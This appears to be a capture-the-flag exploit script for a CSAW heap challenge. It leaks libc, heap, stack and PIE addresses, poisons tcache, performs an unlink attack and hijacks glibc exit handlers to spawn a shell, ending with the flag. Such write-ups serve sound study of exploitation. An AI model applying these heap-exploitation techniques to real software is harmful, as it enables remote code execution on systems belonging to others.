#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chal_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x155C
brva 0x16A8
brva 0x17C6
brva 0x18CB
brva 0x192B
b *__run_exit_handlers+304
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'>> ', choice)

def malloc(pos: int, cap: int):
    menu(1)
    slna(b'position: ', pos)
    slna(b'capacity of: ', cap)

def free(pos: int):
    menu(2)
    slna(b'position: ', pos)

def edit(pos: int, content: bytes):
    menu(3)
    slna(b'position: ', pos)
    sa(b'ammo of: ', content)

def show(pos: int):
    menu(4)
    slna(b'position: ', pos)
    return rl()[:-1]

def extend_size(buf: bytes):
    menu(5)
    sa(b'resource: ', buf)

# ==================== EXPLOIT ====================
p = start()

# leak heap + libc
malloc(0, 0x418)
malloc(1, 0x58)

free(0)
free(1)

libc.address = fixleak(show(0)[:6]) - 0x203b20
slog('libc base @ %#x', libc.address)

heap = fixleak(show(1)[:6]) << 12
slog('heap base @ %#x', heap)

# leak stack
malloc(0, 0x58)
malloc(1, 0x58)

free(0)
free(1)

edit(1, p64(mangle(heap, libc.sym.__libc_argv)))

malloc(0, 0x58)
malloc(1, 0x58)
malloc(2, 0x58)

free(2)

stack_leak = fixleak(show(2)[:8]) ^ mangle(heap, (libc.sym.__libc_argv >> 12))
slog('stack leak @ %#x', stack_leak)

# leak pie
malloc(0, 0x58)
malloc(1, 0x58)

free(0)
free(1)

target = stack_leak - 0xd8
info('target @ %#x', target)
edit(1, p64(mangle(heap, target)))

malloc(0, 0x58)
malloc(1, 0x58)
malloc(2, 0x58)

free(2)

exe.address = ( fixleak(show(2)[:8]) ^ mangle(heap, target >> 12) ) - 0x3d88
slog('exe base @ %#x', exe.address)

extend_size(p64(exe.address + 0x1229))

chunk_array = 0x4060 + exe.address
chunk_size_array = 0x40E0 + exe.address

info('chunk array @ %#x', chunk_array)
info('chunk size array @ %#x', chunk_size_array)

malloc(0, 0x418)
malloc(1, 0x418)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

edit(0, p64(0) + p64(0x420 - 0x10) + p64(chunk_array - 0x18) + p64(chunk_array - 0x10) + b'\x00' * (0x420 - 0x30) + p64(0x410) + p64(0x420))
free(1)

tls = libc.address - 0x3000
initial = libc.sym.initial

info('tls @ %#x', tls)
info('initial @ %#x', initial)

edit(0, p64(0xdeadbeef) * 3 + p64(tls + 0x770) + p64(initial+24))

edit(0, p64(0)) # clear cookie
edit(1, p64(libc.sym.system << 17) + p64(next(libc.search(b'/bin/sh'))))

menu(6)

interactive()
# csawctf{mafmub_hum4n_c4n_1053_gugCi0_bu7_4l13n5_c4n_n3v3r_w1n_dikjop}
